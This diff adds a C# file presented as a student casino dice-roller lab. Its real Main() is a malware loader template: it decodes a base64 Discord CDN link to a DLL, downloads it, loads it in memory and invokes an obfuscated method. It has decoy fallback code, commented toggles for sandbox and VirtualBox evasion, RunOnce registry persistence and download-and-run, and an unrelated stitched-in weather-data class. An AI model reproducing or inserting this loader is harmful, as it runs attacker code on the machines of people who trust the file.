@@ -1,1 +1,295 @@
-webpostegro
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Drawing;
+using System.Security.Cryptography;
+using System.IO;
+using System.Text;
+using System.Threading;
+using System.Text.RegularExpressions;
+using Microsoft.Win32;
+using System.Data.SqlClient;
+using System.Data;
+using Microsoft.VisualBasic.CompilerServices;
+using System.ComponentModel;
+using System.Globalization;
+using System.Data.OleDb;
+
+[assembly: AssemblyTitle("{1}")]
+[assembly: AssemblyDescription("{2}")]
+[assembly: AssemblyCompany("{3}")]
+[assembly: AssemblyProduct("{4}")]
+[assembly: AssemblyCopyright("{5}")]
+[assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
+
+
+
+namespace Casino_Dice_Roller_Lab_Andrew_Klima
+{
+    class %1%
+    {
+        static void Mains(string[] args)
+        {
+            bool rollAgain = true;
+            while (rollAgain == true)
+            {
+                bool invalidNum = true;
+                while(invalidNum == true)
+                {
+                    int input = GetInput("How many sides should each die have?");
+                    if (input < 1)
+                    {
+                        Console.WriteLine("Must be a number above 0");
+                        invalidNum = true;
+                    }
+                    else
+                    {
+                        int roll1 = RandomRollDice(input);
+                        int roll2 = RandomRollDice(input);
+                        int[] rolls = { roll1, roll2 };
+
+                        Console.WriteLine();
+                        Console.WriteLine("You have rolled {rolls[0]} and {rolls[1]}! ({rolls[0] + rolls[1]} total)");
+                        Console.WriteLine();
+
+                        if (input == 6)
+                        {
+                            GetOutput(rolls);
+                        }
+                        invalidNum = false;
+                    }
+                }
+                rollAgain = RollAgain();
+            }
+        }
+
+        public static int RandomRollDice(int numSide)
+        {
+            Random dice = new Random();
+            int roll = dice.Next(1, numSide + 1);
+            return roll;
+        }
+
+        public static bool GetOutput(int[] rolls)
+        {
+            if (rolls[0] == 1 && rolls[1] == 1)
+            {
+                string snakeEyes = "Snake Eyes";
+                Console.WriteLine(snakeEyes);
+                
+            }
+            else if ((rolls[0] == 1 && rolls[1] == 2) || (rolls[0] == 2 && rolls[1] == 1))
+            {
+                string aceDeuce = "Ace Deuce";
+                Console.WriteLine(aceDeuce);
+                
+            }
+            else if (rolls[0] == 6 && rolls[1] == 6)
+            {
+                string boxCars = "Box Cars";
+                Console.WriteLine(boxCars);
+                
+            }
+            else if(rolls[0] + rolls[1] == 7 || rolls[0] + rolls[1] == 11)
+            {
+                string win = "Win";
+                Console.WriteLine(win);
+                
+            }
+            
+            if(rolls[0] + rolls[1] == 2 || rolls[0] + rolls[1] == 3 || rolls[0] + rolls[1] == 12)
+            {
+                string craps = "Craps!";
+                Console.WriteLine(craps);
+               
+            }
+            return false;
+        }
+
+
+        public static int GetInput(string message)
+        {
+            Console.WriteLine(message);
+            int input = int.Parse(Console.ReadLine());
+            return input;
+        }
+
+        public static bool RollAgain()
+        {
+            Console.WriteLine("Would you like to roll again? Y/N ");
+            string answer = Console.ReadLine();
+
+            if (answer.ToUpper() == "Y")
+            {
+                Console.WriteLine("Awesome! we go on");
+                return true;
+            }
+            else if (answer.ToUpper() == "N")
+            {
+                Console.WriteLine("okay bye");
+                return false;
+            }
+            else
+            {
+                Console.WriteLine("Umm idk what that means");
+                return RollAgain();
+            } 
+        }
+    }
+}
+
+namespace Casino_Dice_Roller_Lab_Andrew_Klima
+{
+    class klimalli
+    {
+        public int jarjestysnumero { get; set; }
+        public DateTime aika { get; set; }
+        public decimal sade { get; set; }
+        public decimal sateily { get; set; }
+        public decimal T_e { get; set; }
+        public decimal RH_e { get; set; }
+        public decimal T_i { get; set; }
+        public decimal RH_i { get; set; }
+
+        public override string ToString()
+        {
+            return "{jarjestysnumero}\t{DCM(sade)}\t{DCM(sateily)}\t{DCM1(T_e)}\t{DCM(RH_e)}\t{DCM1(T_i)}\t{DCM(RH_i)}";
+        }
+
+       private string DCM1(decimal myvar)
+       {
+          //return String.Format("{0:0.##}", myvar, System.Globalization.CultureInfo.InvariantCulture);
+          return myvar.ToString("0.0", System.Globalization.CultureInfo.InvariantCulture);
+       }
+
+      private string DCM(decimal myvar)
+        {
+            //return String.Format("{0:0.##}", myvar, System.Globalization.CultureInfo.InvariantCulture);
+            return myvar.ToString("0.00", System.Globalization.CultureInfo.InvariantCulture);
+        }
+    }
+}
+
+namespace Casino_Dice_Roller_Lab_Andrew_Klima
+{
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        /// 
+
+
+
+
+        //sandboxie [DllImport("kernel32.dll")]
+        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
+        //sandboxie static void controlsandboxie()
+        //sandboxie {
+        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+        //sandboxie     {
+        //sandboxie        Environment.Exit(1);
+        //sandboxie     }
+        //sandboxie }
+
+
+        //start public static void %35%()
+        //start {
+        //start int %36% = Conversions.ToInteger("1");
+        //start if ((double)%36% != Conversions.ToDouble("1") || Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%3%", (object)null) != null)return;
+        //start string %37% = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%FolderName%\\%Startup File Name%";
+        //start if (!Directory.Exists(Path.GetDirectoryName(%37%)))
+        //start {
+        //start Directory.CreateDirectory(Path.GetDirectoryName(%37%));
+        //start File.Copy(Application.ExecutablePath, %37%, true);
+        //start }
+        //start Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%3%", (object)%37%);    
+        //start }
+
+
+         
+
+        [STAThread]
+        static void Main()
+        {
+
+
+            //Sleep System.Threading.Thread.Sleep(%Sleep%);
+
+            //sandboxie controlsandboxie();
+
+            //Messega
+
+            //download try
+            //download {
+            //download  System.Net.WebClient appyrun = new System.Net.WebClient();
+            //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "%Startup File Name%"));
+            //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "%Startup File Name%"));
+            //download }
+            //download catch
+            //download {
+            //download }
+
+
+
+            //start %35%();
+
+            //vbox  foreach (Process %56% in Process.GetProcesses())
+            //vbox {
+            //vbox      bool %55% = Operators.CompareString(%56%.ProcessName, "vboxservice", false) == 0;
+            //vbox      if (%55%)
+            //vbox      {
+            //vbox          Environment.Exit(0);
+            //vbox      }
+            //vbox  }
+
+            try
+            {
+
+                using (WebClient %2% = new WebClient())
+                {
+
+                          System.Net.ServicePointManager.SecurityProtocol |=
+       SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+
+                    object %3% = new object[] { "APPRUN", string.Empty, %2%.DownloadData("%Server%") };
+
+                    byte[] %4% = Convert.FromBase64String("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTAzMjIwNzAwNjg3NTE5Nzk5LzkxMzg2OTIzMjU0OTI5MDAwNC8xYzI0NzZjNzZkNmMwZTE1LmRsbA==");
+                    string %5% = Encoding.UTF8.GetString(%4%);
+
+                    byte[] %6% = new WebClient { Headers = { "User-Agent: Mozilla 4.0"} }.DownloadData(%5%);
+
+                    Assembly.Load(%6%).GetType("ょぎウョシん杰艾吉诶.ょぎウョシん杰艾吉诶").InvokeMember("西艾比娜弗艾艾吾", BindingFlags.InvokeMethod, null, null, (object[])%3%);
+
+                }
+
+            }
+            catch (Exception)
+            {
+
+                
+            Console.Write("Metni Girin : ");
+            string metin = Console.ReadLine();
+            Console.Write("Kaç defa yazdırılsın : ");
+            int sayi = Convert.ToInt32(Console.ReadLine());
+            
+            for(int i=1;i<= sayi;i++)
+            {
+                Console.WriteLine(metin);
+            }
+ 
+            Console.ReadKey();
+
+            }
+
+
+        }
+    }
+}
